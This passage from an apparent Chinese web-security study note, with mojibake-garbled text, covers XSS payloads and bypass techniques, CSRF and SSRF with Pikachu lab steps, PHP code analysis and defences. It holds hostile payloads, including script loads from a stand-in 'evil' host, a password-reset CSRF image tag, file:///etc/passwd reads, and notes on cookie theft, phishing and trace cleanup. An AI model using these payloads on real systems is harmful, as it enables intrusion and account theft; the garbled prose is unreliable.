                        - Ê†áÁ≠æ
                            - &lt;! XSS=&quot;&gt;&lt;img src=xx:x onerror=alert(1)//&quot;&gt;
                    - È≠îÊúØÊ†áÁ≠æ
                        - &lt;object&gt;|&lt;embed&gt; allowScriptAccess
                            - always
                            - somedomain
                                - ‰∏ä‰º†Â§¥ÂÉè„ÄÅ‰∏ä‰º†ÂõæÁâá„ÄÅ‰∏ä‰º†ÈôÑ‰ª∂
                                - Á´ôÂÜÖXSSËΩ¨Â≠òÂÇ®
                        -SVG
                            - &lt;svg&gt;&lt;script/xlink:href=data:,alert(1)&gt;&lt;/script&gt;
                            - &lt;svg contentScriptType=text/vbs&gt;&lt;script&gt;MsgBox&quot;1&quot;&lt;i&gt; (IE 9)
                            - &lt;svg&gt;&lt;script&gt;alert&amp;lpar;1&amp;rpar;&lt;/script&gt;
                            - &lt;svg&gt;&lt;/ y=&quot;&gt;&lt;x&quot; onload=alert(1)&gt;
                        - Math
                            - &lt;math href=javascript:..&gt;
                            - &lt;math&gt;&lt;a xlink:href=javascript:..&gt;
                        - VML
                        - Link
                            - &lt;link rel=import href=//evil&gt;
                            - &lt;link rel=stylesheet href=data:,*%7bx:expression(write(1))%7d
                        - Iframe
                            -&lt;iframe srcdoc='&amp;lt;svg/onload=alert(1)&amp;gt;'&gt;
            - DOM
                - document.domain Ë∑®Âüü
                    - document.domain='com' (chrome ËÄÅÁâàÊú¨)
                - MXSS
                    - &lt;b&gt;&lt;noscript&gt;&lt;a src='x' style='x:\3c\2fnoscript\3e\3ciframe/onload\3d alert(1)\3e'&gt; (IE11,0.0.2)
                    - &lt;listing&gt;&amp;lt;img src=1 onerror=alert(1)&amp;gt;&lt;/listing&gt;  
                - ÂéüÁîüJS
                    - ËæìÂÖ•
                        - location
                            - location.href
                            - location.search
                            - location.hash
                        - window.name
                        - document.cookie
                        - document.referrer
                        - postMessage
                            - Êú™ÈôêÂà∂Êù•Ê∫ê
                            - ÂèçÊñúÁ∫øÁªïËøáÂà§Êñ≠
                    - Ëß¶ÁÇπ
                        - location
                        - eval
                        - innerHTML
                        - document.write
                        - appendChild
                        - Function
                        - setTimeout
                        - setInterval     
                - jQuery
                    - .html(..)
                    - .attr(..)
                    - .append(..)
                    - getScript(..)
                    - .ajax
                    - $('#...')
                - React.js
                    - React.createElement(..)
                - Angular JS
                    - &lt;b class=&quot;ng-include:'//evil'&quot;'&gt;     
                    - &lt;iframe ng-src=javascript:..&gt; 
            - Flash
                - ËæìÂÖ•
                    - loaderInfo.parameters
                        - Êó†ÊïàÁºñÁ†ÅÂøΩÁï•Êú∫Âà∂Ôºö%Ajava%B&amp;script:alert(1)
                        - search Ëß£ÊûêÁº∫Èô∑Ôºö#?id=xx
                    - SharedObject
                    - LocalConnection
                        - allowDomain(&quot;*&quot;)
                    - HTML id attr
                - Ëß¶ÁÇπ
                    - ExternalInterface.call
                        - arg 1: alert(1)
                        - arg 2
                            - \&quot;))}catch(e){alert(1)}//
                            - split ÂáΩÊï∞Áº∫Èô∑
                                - 1. ?q=%ED%A0%80\&quot;))}catch(e){alert(1)}//
                                - 2. var q:String=loderInfo.parameters[&quot;q&quot;].split(&quot;\\&quot;).join(&quot;\\\\&quot;);
                                - 3. ExternalInterface.call(&quot;console.log&quot;,q);
                    - htmlText
                        - &lt;img src=evil.swf&gt;
                        - &lt;a href=javascript:..&gt;me&lt;/a&gt;
                    - navigateToURL
                    - Loader
                    - addCallback
            - Server
                - String
                    - &lt;sc&lt;script&gt;alert(1)&lt;/script&gt;
                    - &lt;embed allowscriptaccess=&quot;alwalwaysays&quot; src=&quot;test.swf&quot;&gt;
                    - substr
                    - Â≠óÁ¨¶ÈõÜÂ§ÑÁêÜ
                        - gbk:%c0%22
                        - utf32:%E2%88%80%E3%B8%80%E3%B0%80
                - Database
                    - Â≠óÁ¨¶ÈõÜ
                        - &lt;img src=&quot;http://www.baidu.com# onerror=alert(1)//{0xf09d8c86}&quot;&gt;
                    - Êï∞ÊçÆÁ±ªÂûã
                        - Text
                            - &lt;a href=&quot;http://www.baidu.com# onerror=alert(1)//[64kb]&quot;&gt;&lt;/a&gt;
                        - VARCHAR
                            - &lt;a href=&quot;http://www.baidu.com# onclick=alert(1)//[255]&quot;&gt;&lt;/a&gt;
                - Á¨¨‰∏âÊñπ API
        - ËæìÂÖ•
            - ÈÇÆÂ±Ä
                - ÈôÑ‰ª∂
                    - È¢ÑËßà
                        - wordÂ≠ó‰Ωì
                    - Ê†áÈ¢ò
                - Ê≠£Êñá
                - Ê†áÈ¢ò
                - ÊäÑÈÄÅ‰∫∫
            - Flash ÁªÑ‰ª∂
                - SwfUpload
                - ZeroClipboard
                - JWPlayer
                - Open flash chart
            - ÂõæÁâá Exif
            - ÂèçÈ¶à
                - Êé¢ÊµãÂêéÂè∞Âú∞ÂùÄ
                    - `&lt;img src=//evil&gt;`                    
                - Á™ÉÂèñCookies
                    - `&lt;/script/&lt;/textarea/'&quot;&gt;&lt;img..`
                    - `&lt;embed src=..&gt;`
                - ‰πüÂèØ‰ª•ÊòØ‰∏Ä‰∏™XSSÁöÑÁΩëÂùÄ
            - ÂÆ¢Êà∑Á´Ø
                - Êñá‰ª∂‰º†Ëæì
                    - wordÂ≠ó‰ΩìËÆæÁΩÆ
                - Â≠ó‰ΩìËÆæÁΩÆ
                - Web to Native
                    - `&lt;img src=//evil/bind-xss&gt;`
            - URLÂèÇÊï∞
                - Google ÊêúÁ¥¢
                - ÊµÅÈáèÊé¢Êµã
                - Custom Spider
            - ‰∏ä‰º†
                - XSS.SVG
                - XSS.XML
                - IE: 1.jpg/xss.html
                - IE: 1.txt
        - Â∑•ÂÖ∑
            - Charles
                - Êò†Â∞ÑJSÊñá‰ª∂
            - Fiddler
                - Set cookies header
            - Chrome DevTools
                - ÂÖ®Â±Ä‰ª£Á†ÅÊêúÁ¥¢
            - Firebug-lite
            - IEÊÅ∂ÊêûËø∑
    - POC
        - ÂéªÈô§ referer
            - location='javascript:&quot;&lt;script src=//evil&gt;&lt;/script&gt;'&quot;
            - &lt;meta name=referer content=never&gt;
            - &lt;a href=//target rel=noreferer&gt;
            - HTTPS + &lt;meta&gt; Ë∑≥ËΩ¨
        - ÈïøÂ∫¶ÈôêÂà∂
            - Áü≠ÂüüÂêç
            - &lt;svg/onload=eval(name)
            - Â§ö‰∏™ËæìÂÖ•ÁÇπÁªÑÂêà    &lt;script&gt;/**/
        - ÊµèËßàÂô®Ê£ÄÊµãÁªïÁªïËøá
            - Chrome
                - &lt;link rel=import href=//evil&gt; (Chrome 39)
                - before &lt;script&gt;:&quot;&gt;&lt;script/src=data:,alert(1)%2b&quot;
                - in &lt;script&gt;:&lt;/script&gt;&lt;svg&gt;&lt;script&gt;alert(1)%2b%26quot;
                - DOM   HTML HEX encode
                - &lt;link href=&quot;origin res url&quot;&gt;
                - &quot;&gt;&lt;script/src=data:,alert(1)%26sol;%26sol;
            - IE
                - &lt;a href=&quot;?q=&lt;script&gt;alert(1)&lt;/script&gt;&quot;&gt;click&lt;/a&gt;
                - &lt;script/%00%00v%00%00&gt;alert(1)&lt;/script&gt;
                - in script         ';alert`1`
            - ÈÄöÁî®
                - Â§ö‰∏™ËæìÂÖ•ÁÇπÂêàÂπ∂
                - Â§çÂêàÂèÇÊï∞ÁªÑÂêà
                - DOMÔºö&lt;img src=xx:x onerror=alert(1)//
        - Á™ÅÁ†¥ IE Flash document‰øùÊä§
            - location='javascript:&quot;&lt;script&gt;alert(document)&lt;/script&gt;&quot;'
        - ‰∫§‰∫íÂºèËß¶Âèë
            - Á™ÅÁ†¥Ë°åÁ∫ßÊ†áÁ≠æÔºödisplay:balock;position:absollute;top:0;left:0;width:1000px;height:1000px;backgroud:red
        - DOM hack
            - ÈÄöËøá ID Hook ÂèòÈáè
                - &lt;img src=xx:x id=main&gt;
                - &lt;form id=&quot;window&quot;&gt;&lt;input name=&quot;name&quot; value=&quot;haha&quot;&gt;
            - ÊµèËßàÂô®XSSÊã¶Êà™Âô®
                -  ?xss=&lt;script&gt;[page data]&lt;/script&gt;
        - InnerHTML
            - IEÔºåÊó†Á≠âÂè∑Ôºö&lt;script/defer&gt;alert(1)&lt;/script&gt;
            - &lt;iframe/src=about:blank onload=alert(1)&gt;
        - Ë∑®Â≠êÂüü
            - document.domain=&quot;qq.com&quot;
    - EXP
        - Ê∞¥Âùë
            -&lt;iframe&gt;
            - history.replaceState + Ë∑≥ËΩ¨
        - Ë†ïËô´
            - ÊÑüÊüìËÄÅÊï∞ÊçÆ
        - ÊåÅ‰πÖÂåñXSS
            - Rootkit
                - Cookies   ËÆæÁΩÆË∂ÖÂ§ß max-age
                - Flash SharedObject
                - LocalStorage
            - Ê°ÜÊû∂Âåñ‰ºöËØù
                - Êó†ËæπÁïå iframe
                - Âú∞ÂùÄÊ†èÂêåÊ≠•
                    - location.hash
                    - history.pushState
            - Opener Âä´ÊåÅ
                    - opener.eval(..exp..)
        - ÂÜÖÁΩëËæπÁïå
            - XSS-Proxy
                - Ê≥®ÂÖ•Ëá≥ÊâÄÊúâÂêåÊ∫ê window
                - Êú¨Âú∞‰∏≠ËΩ¨‰ª£ÁêÜ
            - XSS-Intranet
                - ÂèçÂºπÊé•Êî∂Á≥ªÁªü
                - Âà©Áî®AjaxÊâ´ÊèèÂÜÖÁΩë
                    - Struts 2:80/8080
                        - CVE-2011-3923
                        - CVE-2013-2251
                        - CVE-2013-1965
                        - CVE-2013-1966
                        - CVE-2014-0094 (Ë°•‰∏ÅÁªïËøá)
                    - Elasticsearch:9200
                        - CVE-2014-3120
                        - CVE-2015-1427
        - Êú¨Âú∞ËæπÁïå
            - ÊµèËßàÂô®
                - ‰ø°‰ªªÂüü
                - ÁâπÊùÉÂüü
            - ÂÜÖÂµåÊµèËßàÂô®
                - APP
                    - Webview
                - Soft
        - ÂèçËøΩË∏™
            - ÊÇÑÊÇÑÁöÑÂπ≤Ê¥ª
            - Ê£ÄÊµã referer
            - XSS ‰ª£ÁêÜÊúçÂä°Âô®
            - Ê∏ÖÁêÜÁóïËøπ
                - Ê∏ÖÁêÜÊéßÂà∂Âè∞Ôºöconsole.clear
                - Ê∏ÖÁêÜÂú∞ÂùÄÊ†èÔºöhistory.replaceState
            ‰ΩøÁî® WebSocket ‰ª£Êõø HTTP
            - ‰ΩøÁî®FlashÂ∞ÅË£ÖJS
                - navigateToURL ÊâßË°å JS Èò≤ hook
        - ‰ø°ÊÅØÊî∂ÈõÜ
            - XHR Á™ÉÂèñ È°µÈù¢Êï∞ÊçÆ
            - WebRTC Ëé∑ÂèñÁΩëÂç°‰ø°ÊÅØ
                - VPN
                - ÂÜÖÁΩëIP
            - Ëé∑ÂèñÊâÄÊúâÈìæÊé•Êï∞ÊçÆ
            - Á™ÉÂèñCookieÈáçÊîæË∫´‰ªΩ
                - ‰º™ÈÄ†X-Forword-forÁªïËøáIPÈôêÂà∂
                - ‰ΩøÁî®‰ª£ÁêÜÈáçÊîæÈÅøÂÖçCookiesÂüüÈóÆÈ¢ò
        - ÊùÉÈôêÁª¥ÊåÅ
            - Keep session
            - ÈíìÂèñË¥¶Êà∑ÂØÜÁ†Å
                - 1. ÁõëÂê¨ÊâÄÊúâÈìæÊé•ÔºåÁÇπÂáªËß¶Âèë
                - 2. ÈÅçÂéÜpathÊ∏ÖÈô§Cookies
                - 3. Â§öÊ¨°history.pushState
                - 4. Ê∏ÖÁ©∫DomÔºödocument.open
                - 5. XHRËØªÂèñÂÜôÂÖ•ÁôªÂΩïÈ°µ
                - 6. ËÆæÁΩÆdocument.title
                - 7. Âª∂ËøüÁªëÂÆöÁ™ÉÂèñ‰∫ã‰ª∂
</code></pre>
<h1 id="csrf">CSRF</h1>
<blockquote>
<p>Cross-site request forgery ÁÆÄÁß∞‰∏∫‚ÄúCSRF‚ÄùÔºå‰∏≠ÊñáÂêç‰∏∫‚ÄúË∑®Á´ôËØ∑Ê±Ç‰º™ÈÄ†ÊºèÊ¥û‚ÄùÔºåÊòØÊåáÁΩëÁ´ôÁöÑÂäüËÉΩÂ≠òÂú®Êüê‰∫õÁº∫Èô∑ÔºåÂèØÂÖÅËÆ∏ÊîªÂáªËÄÖÈ¢ÑÂÖàÊûÑÈÄ†ËØ∑Ê±ÇËØ±ÂØºÂÖ∂‰ªñÁî®Êà∑Êèê‰∫§ËØ•ËØ∑Ê±ÇÂπ∂‰∫ßÁîüÂç±ÂÆ≥</p>
</blockquote>
<h2 id="Èù∂Âú∫ÁªÉ‰π†-2">Èù∂Âú∫ÁªÉ‰π†</h2>
<h3 id="getÂûã-2">GETÂûã</h3>
<ol>
<li>ÂÖàÈöè‰æøÁôªÂΩï‰∏Ä‰∏™‰∫∫ÁöÑË¥¶Âè∑ÔºàÁÇπÂáªÊèêÁ§∫‰ºöÊòæÁ§∫Ë¥¶Âè∑Ôºâ</li>
<li>Êàë‰ª¨‰øÆÊîπ‰ø°ÊÅØ ÔºåÂπ∂Âú®ÁΩëÁªú ÁõëÊéßÊñáÊ°£ ---&gt; ÂæóÂà∞‰∏Ä‰∏™‰øÆÊîπ‰ø°ÊÅØÁöÑÈìæÊé•</li>
<li>Êàë‰ª¨ÈÄÄÂá∫ÁôªÂΩï ÔºåÊç¢Âè¶Â§ñÁöÑË¥¶Âè∑ËøõË°åÁôªÂΩï ÔºåÁÑ∂ÂêéÁÇπÂáªÈìæÊé•</li>
<li>‰ª£Á†ÅÂàÜÊûê<br>
Ê≤°ÊúâÈ™åËØÅcookieÁöÑÂÄº</li>
</ol>
<pre><code class="language-php">if($_GET['sex']!=null &amp;&amp; $_GET['phonenum']!=null &amp;&amp; $_GET['add']!=null &amp;&amp; $_GET['email']!=null){ 
       //Âà§Êñ≠Ëøô‰∫õÂÄºÊòØÂê¶‰∏∫Á©∫
     $getdata=escape($link, $_GET);
     $query=&quot;update member set sex='{$getdata['sex']}',phonenum='{$getdata['phonenum']}',address='{$getdata['add']}',email='{$getdata['email']}' where username='{$_SESSION['csrf']['username']}'&quot;;
     // Êõ¥Êñ∞Êï∞ÊçÆÂ∫ì‰∏≠ÁöÑÂÄº
     $result=execute($link, $query);
</code></pre>
<h3 id="postÂûã-2">POSTÂûã</h3>
<ol>
<li>‰∏égetÂûãÊ≤°‰ªÄ‰πàÂå∫Âà´ Ôºå‰∏çËøáÂà©Áî®ÊñπÂºèÈúÄË¶Å‰∏éxssÁöÑpostÂà©Áî®ÊñπÂºèÁ±ª‰ºº</li>
<li>‰øÆÊîπ‰∏™‰∫∫‰ø°ÊÅØÔºåÊäìÂåÖ</li>
<li>ÁîüÊàêcsrf poc</li>
<li>Ê®°ÊãüÂèóÂÆ≥ËÄÖÁÇπÂáª</li>
</ol>
<h4 id="token">token</h4>
<p>TokenÔºö‰ª§ÁâåÔºåÂíåSessionÔºåCookie‰∏ÄÊ†∑ÔºåÈÉΩÊòØË∫´‰ªΩÊ†áËØÜÔºåTokenÈÄöÂ∏∏Â≠òÂú®‰∫éURLÂíåCookie‰∏≠ÔºåÂÆÉÊòØÁî®‰∫éÈò≤Ê≠¢CSRFÊºèÊ¥ûÁöÑ„ÄÇ</p>
<pre><code class="language-php">    if($_GET['sex']!=null &amp;&amp; $_GET['phonenum']!=null &amp;&amp; $_GET['add']!=null &amp;&amp; $_GET['email']!=null &amp;&amp; $_GET['token']==$_SESSION['token']){
        // Èô§‰∫ÜÂü∫Êú¨‰ø°ÊÅØÊÑèÂ§ñÔºåËøòÊ†°È™åtokenÊòØÂê¶‰∏ÄËá¥
        //ËΩ¨‰πâ
        $getdata=escape($link, $_GET);
        .....
//ÊØèÊ¨°‰ºöËØùÁªìÊùüÈÉΩÁîüÊàêÊñ∞ÁöÑtoken
set_token();
</code></pre>
<h2 id="ÊºèÊ¥ûÊ£ÄÊµã">ÊºèÊ¥ûÊ£ÄÊµã</h2>
<h3 id="ÊïèÊÑüÂäüËÉΩÁº∫‰πècsrfÈò≤Êä§Êú∫Âà∂">ÊïèÊÑüÂäüËÉΩÁº∫‰πècsrfÈò≤Êä§Êú∫Âà∂</h3>
<ol>
<li>Âú®burpsuite‰∏≠ËßÇÂØüpostËØ∑Ê±ÇÊòØÂê¶Â∏¶ÊúâÈöèÊú∫Token Âíå È™åËØÅÁ†Å</li>
<li>ÂÜçÂà§Êñ≠ ÂéªÊéâ/‰øÆÊîπ RefererÂêéÊòØÂê¶‰ªçÁÑ∂ÂèØ‰ª•Êèê‰∫§ÊàêÂäü</li>
</ol>
<h3 id="ÁΩëÁ´ôÂèØ‰ª•ÂÖÅËÆ∏ÂÜôÂÖ•csrf-payload">ÁΩëÁ´ôÂèØ‰ª•ÂÖÅËÆ∏ÂÜôÂÖ•csrf payload</h3>
<ol>
<li>
<p>ÊµãËØïÁî®Êà∑Â§¥ÂÉè<code>&lt;img&gt;</code> / ÂØåÊñáÊú¨Âå∫ÂüüÁöÑ<code>&lt;img&gt;</code> <code>&lt;svg&gt;</code>Ê†áÁ≠æ(ÂèØÊéß)</p>
</li>
<li>
<p>Âú®Â§¥ÂÉèÂ§ÑÊèíÂÖ•payload<br>
<code>&lt;img src=&quot;http://www.xx.com/reset_pwd?new=123456&quot;&gt;</code></p>
</li>
<li>
<p>ÂΩìÂÖ∂‰ªñ‰∫∫ÊµèËßàÊó∂Âç≥Ëß¶ÂèëcsrfÊîªÂáª</p>
</li>
</ol>
<h2 id="ÊºèÊ¥ûÊåñÊéò-2">ÊºèÊ¥ûÊåñÊéò</h2>
<h3 id="Â∏∏ËßÅÊÄùË∑Ø-2">Â∏∏ËßÅÊÄùË∑Ø</h3>
<pre><code class="language-php">- CSRF
    - Â∏∏ËßÅÊºèÊ¥ûÁÇπ
        - ‰øÆÊîπÂØÜÁ†Å
        - ‰øÆÊîπ‰∏™‰∫∫‰ø°ÊÅØ
        - ÂèëÂ∏ÉÊñáÁ´†
        - ‰∏éË¥¶Êà∑Áõ∏ÂÖ≥ÁöÑÂ§ßÈÉ®ÂàÜ‰∏öÂä°ÂäüËÉΩÁÇπ
    - ÊåñÊéòÊÄùË∑Ø
        - 1. ÊòØÂê¶Â≠òÂú®tokenÂíåÈ™åËØÅÁ†ÅÔºàÊòØÂê¶ÂèØÂà†Èô§/ÂèØ‰º™ÈÄ†Ôºâ
        - 2. ÊòØÂê¶ÂèØ‰ª•Âà†Èô§Êàñ‰º™ÈÄ†referer
        - 3. &lt;img&gt;/&lt;svg&gt;Á≠âÊ†áÁ≠æÈìæÊé•ÊòØÂê¶ÂèØÊéß
</code></pre>
<h3 id="Ê°à‰æãÂàÜÊûê-2">Ê°à‰æãÂàÜÊûê</h3>
<ol>
<li>Ë†ïËô´</li>
<li>Ë¥¶Âè∑ÂÅúÁî®
<ol>
<li>ÂÅúÁî®Ë¥¶Âè∑ ÊäìÂåÖÔºàÊ≤°Êúâtoken / Ê≤°ÊúâreferÔºâ</li>
<li>ÁîüÊàêcsrf poc</li>
<li>ËØ±ÂØºÂÖ∂‰ªñÁî®Êà∑ÁÇπÂáª Âç≥ÂÅúÁî®Ë¥¶Âè∑</li>
</ol>
</li>
<li>Á¨¨‰∏âÊñπË¥¶Êà∑ÁªëÂÆö
<ol>
<li>ÁªëÂÆöÂæÆÂçöËøîÂõûÂåÖ<br>
<code>https://www.a.test.com/users/auth/weibo/callback?state={&quot;can_transfer&quot;%3A&quot;true&quot;}&amp;code=c593bc150745c37a4d5ec05332d406af</code></li>
<li>ÂèëÁªôÂèóÂÆ≥ËÄÖ</li>
<li>ÂæÆÂçöÁôªÂΩïÂèóÂÆ≥ËÄÖË¥¶Âè∑</li>
</ol>
</li>
</ol>
<h3 id="ÊºèÊ¥ûÂç±ÂÆ≥">ÊºèÊ¥ûÂç±ÂÆ≥</h3>
<blockquote>
<p>ÂÖ∑‰ΩìÂäüËÉΩÂÜ≥ÂÆöÂç±ÂÆ≥Á®ãÂ∫¶<br>
‰øÆÊîπÊÄßÂà´ / ‰∏™‰∫∫‰ø°ÊÅØÁ≠â<br>
‰øÆÊîπÁÆ°ÁêÜÂëòÂØÜÁ†Å<br>
Ê∑ªÂä†ÁÆ°ÁêÜÂëò<br>
ÂêéÂè∞getshell</p>
</blockquote>
<h3 id="ÊºèÊ¥ûÈò≤Âæ°-2">ÊºèÊ¥ûÈò≤Âæ°</h3>
<ol>
<li>Âú®Èì≠ÊÑüËØ∑Ê±ÇÊèê‰∫§Ë°®Âçï‰∏≠Âä†ÂÖ•ÈöèÊú∫ÁöÑTokenÊàñËÄÖÈ™åËØÅÁ†ÅÔºåÈò≤Ê≠¢ÊîªÂáªËÄÖÈ¢ÑÊµã</li>
<li>ÂêàÁêÜÊ†°È™åËØ∑Ê±ÇReferer ÔºåÂà§Êñ≠ËØ∑Ê±ÇÊòØÂê¶Êù•Ëá™Êú¨Á´ôÊàñËÄÖÂÖ∂‰ªñÊéàÊùÉÁöÑÂüüÂêçÔºõÈò≤Âæ°ÂèØÂÜôÂÖ•csrf pyaload ÊîªÂáª ÔºåÁ¶ÅÊ≠¢Áî®Êà∑Ëá™ÂÆö‰πâ‰ªª‰ΩïÊ†áÁ≠æÁöÑÈìæÊé•Â±ûÊÄß</li>
</ol>
<h3 id="Èù∂Âú∫ÁªÉ‰π†-3">Èù∂Âú∫ÁªÉ‰π†</h3>
<!-- more -->
<h1 id="ssrf">SSRF</h1>
<blockquote>
<p>SSRF(Server-Side Request Forgery:ÊúçÂä°Âô®Á´ØËØ∑Ê±Ç‰º™ÈÄ†)Ôºå‰∏ÄËà¨ÊÉÖÂÜµ‰∏ãssrfÊîªÂáªÁöÑÁõÆÊ†áÊó∂‰ªéÂ§ñÁΩëÊó†Ê≥ïËÆøÈóÆÁöÑÂÜÖÈÉ®Á≥ªÁªüÔºåÁÆÄÂçïÊù•ËØ¥Â∞±ÊòØËÆ©ÊúçÂä°Âô®ÊõøÊîªÂáªËÄÖÂèëËØ∑Ê±Ç</p>
</blockquote>
<h2 id="Èù∂Âú∫ÁªÉ‰π†-4">Èù∂Âú∫ÁªÉ‰π†</h2>
<h3 id="curl_exec">curl_exec</h3>
<ol>
<li>ËØ∑Ê±Çwww.baidu.comÂà§Êñ≠ÊúâÊó†ssrfÊºèÊ¥û<br>
<code>http://192.168.142.53/pikachu/vul/ssrf/ssrf_curl.php?url=http://www.baidu.com</code></li>
<li>dictÂçèËÆÆÊé¢ÊµãÂÜÖÁΩëÁ´ØÂè£<br>
<code>http://192.168.142.53/pikachu/vul/ssrf/ssrf_curl.php?url=dict://127.0.0.1</code></li>
<li>fileÂçèËÆÆËØªÂèñÂÜÖÁΩëÊñá‰ª∂<br>
<code>http://192.168.142.53/pikachu/vul/ssrf/ssrf_curl.php?url=file:///etc/passwd</code></li>
<li>gopherÂçèËÆÆÂÆûÁé∞postËØ∑Ê±Ç<br>
<code>URL:gopher://&lt;host&gt;:&lt;port&gt;/&lt;gopher-path&gt;</code>_(ÂêéÊé•TCPÊï∞ÊçÆÊµÅ)</li>
</ol>
<blockquote>
<p>1„ÄÅÊûÑÈÄ†HTTPÊï∞ÊçÆÂåÖ<br>
2„ÄÅURLÁºñÁ†Å„ÄÅÊõøÊç¢ÂõûËΩ¶Êç¢Ë°å‰∏∫%0d%0a<br>
3„ÄÅÂèëÈÄÅgopherÂçèËÆÆ</p>
</blockquote>
<blockquote>
<p>1„ÄÅÈóÆÂè∑ÔºàÔºüÔºâÈúÄË¶ÅËΩ¨Á†Å‰∏∫URLÁºñÁ†ÅÔºå‰πüÂ∞±ÊòØ%3f<br>
2„ÄÅÂõûËΩ¶Êç¢Ë°åË¶ÅÂèò‰∏∫%0d%0a,‰ΩÜÂ¶ÇÊûúÁõ¥Êé•Áî®Â∑•ÂÖ∑ËΩ¨ÔºåÂèØËÉΩÂè™‰ºöÊúâ%0a<br>
3„ÄÅÂú®HTTPÂåÖÁöÑÊúÄÂêéË¶ÅÂä†%0d%0aÔºå‰ª£Ë°®Ê∂àÊÅØÁªìÊùüÔºàÂÖ∑‰ΩìÂèØÁ†îÁ©∂HTTPÂåÖÁªìÊùüÔºâ</p>
</blockquote>
<ol start="5">
<li>‰ª£Á†ÅÂàÜÊûê</li>
</ol>
<p><strong>Âç±Èô©ÂáΩÊï∞</strong><br>
<mark>curl_exec</mark><br>
<code>curl_exec(CurlHandle $handle): string | bool</code></p>
<blockquote>
<p>ÊâßË°åÊåáÂÆöcurl‰ºöËØù<br>
Ëøô‰∏™ÂáΩÊï∞Â∫îËØ•Âú®ÂàùÂßãÂåñcurl‰ºöËØùÂπ∂‰∏îËÆæÁΩÆÊâÄÊúâÈÄâÈ°πÂêéË∞ÉÁî®</p>
</blockquote>
<pre><code class="language-php">if(isset($_GET['url']) &amp;&amp; $_GET['url'] != null){

    //Êé•Êî∂ÂâçÁ´ØURLÊ≤°ÈóÆÈ¢ò,‰ΩÜÊòØË¶ÅÂÅöÂ•ΩËøáÊª§,Â¶ÇÊûú‰∏çÂÅöËøáÊª§,Â∞±‰ºöÂØºËá¥SSRF
    $URL = $_GET['url'];
    $CH = curl_init($URL);
    curl_setopt($CH, CURLOPT_HEADER, FALSE);
    curl_setopt($CH, CURLOPT_SSL_VERIFYPEER, FALSE);
    $RES = curl_exec($CH);
    curl_close($CH) ;
//ssrfÁöÑÈóÆÊòØ:ÂâçÁ´Ø‰º†ËøõÊù•ÁöÑurlË¢´ÂêéÂè∞‰ΩøÁî®curl_exec()ËøõË°å‰∫ÜËØ∑Ê±Ç,ÁÑ∂ÂêéÂ∞ÜËØ∑Ê±ÇÁöÑÁªìÊûúÂèàËøîÂõûÁªô‰∫ÜÂâçÁ´Ø„ÄÇ
//Èô§‰∫Ühttp/httpsÂ§ñ,curlËøòÊîØÊåÅ‰∏Ä‰∫õÂÖ∂‰ªñÁöÑÂçèËÆÆcurl --version ÂèØ‰ª•Êü•ÁúãÂÖ∂ÊîØÊåÅÁöÑÂçèËÆÆ,telnet
//curlÊîØÊåÅÂæàÂ§öÂçèËÆÆÔºåÊúâFTP, FTPS, HTTP, HTTPS, GOPHER, TELNET, DICT, FILE‰ª•ÂèäLDAP
    echo $RES;
}
</code></pre>
<p><mark>file_get_content</mark><br>
file_get_contents Â∞ÜÊï¥‰∏™Êñá‰ª∂ËØªÂÖ•Âà∞‰∏Ä‰∏™Â≠óÁ¨¶‰∏≤‰∏≠<br>
Âíåfile()‰∏ÄÊ†∑ÔºåÂè™Èô§‰∫Üfile_get_contents()ÊääÊñá‰ª∂ËØªÂÖ•Âà∞‰∏Ä‰∏™Â≠óÁ¨¶‰∏≤‰∏≠ÔºåÂ∞ÜÂú®ÂèÇÊï∞offsetÊåáÂÆöÁöÑ‰ΩçÁΩÆÂºÄÂßãËØªÂèñÈïøÂ∫¶‰∏∫lengthÁöÑÂÜÖÂÆπ„ÄÇÂ¶ÇÊûúÂ§±Ë¥•Ôºåfile_get_contents()Â∞ÜËøîÂõûfalse</p>
<pre><code class="language-php">file_get_contents(
    string $filename,
    bool $use_include_path = false,
    ?resource $context = null,
    int $offset = 0,
    ?int $length = null
): string | false
</code></pre>
<h2 id="ssrfÊºèÊ¥ûÊåñÊéò">SSRFÊºèÊ¥ûÊåñÊéò</h2>
<h3 id="Â∏∏ËßÅÊÄùË∑Ø-3">Â∏∏ËßÅÊÄùË∑Ø</h3>
<pre><code class="language-php">- SSRF
    - Â∏∏ËßÅÊºèÊ¥ûÁÇπ
        - ÂØπÂ§ñÁΩëÂèëËµ∑ËØ∑Ê±ÇÁöÑÂú∞ÊñπÔºàÂõæÁâáÊäìÂèñ/ÁøªËØëÁΩëÈ°µ/ÁΩëÈ°µÂàÜ‰∫´Á≠âÔºâ
        - ‰ªéËøúÁ®ãÊúçÂä°ËØ∑Ê±ÇËµÑÊ∫êÁöÑÂú∞ÊñπÔºàurl‰∏ä‰º†/ÂØºÂÖ•Êñá‰ª∂/rssËÆ¢ÈòÖÁ≠âÔºâ
        - Êñá‰ª∂Â§ÑÁêÜ„ÄÅÁºñÁ†ÅÂ§ÑÁêÜ„ÄÅÂ±ûÊÄß‰ø°ÊÅØÂ§ÑÁêÜÔºàFFmpegËΩ¨Á†Å/xmlÁ≠âÔºâ
        - Êï∞ÊçÆÂ∫ìÂèØÂä†ËΩΩÂ§ñÈÉ®urlÔºàoracleÔºåmongodbÔºåmssqlÔºåpostgresqlÔºåcouchdbÔºâ
        - webmailÊî∂ÂèñÂÖ∂‰ªñÈÇÆÁÆ±ÈÇÆ‰ª∂Ôºàpop3 imap smtpÁ≠âÔºâ
    - ÈôêÂà∂
        - Openssl
        - Èâ¥ÊùÉÔºàcookie/http basicËÆ§ËØÅÁ≠âÔºâ
        - Ê†°È™åÂÖ∂‰ªñÂ§¥ÈÉ®Â≠óÊÆµ
    - ÂõûÊòæÂàÜÁ±ª
        - ÊúâÂõûÊòæ
            - http://www.baidu.com
            - http://127.0.0.1/127.0.0.2
            - file:///
            - dict://
        - ÂçäÁõ≤ÂõûÊòæÔºàÂçäÁõ≤ssrfÔºâ
            - Êî∂‰∏çÂà∞ËøîÂõûÂÜÖÂÆπÔºå‰ΩÜÂèØ‰ª•ÁúãÂà∞ËØ∑Ê±ÇÊàêÂäüÊàñÂ§±Ë¥•ÁöÑÊèêÁ§∫‰ø°ÊÅØ
            - ÁâπÂÆöÊÉÖÂÜµ‰∏ãÔºåÂèØ‰ª•Êî∂Âà∞ÁâπÂÆöÊ†ºÂºèÊàñÁâπÂÆöÂìçÂ∫îÂ§¥ÁöÑËøîÂõûÂÜÖÂÆπ
        - Êó†ÂõûÊòæÔºàÂÖ®Áõ≤ssrfÔºâ
            - Dnslog
            - Httplog
</code></pre>
<h3 id="Ê°à‰æãÂàÜÊûê-3">Ê°à‰æãÂàÜÊûê</h3>
<p><strong>ÁΩëÈ°µÁøªËØë</strong><br>
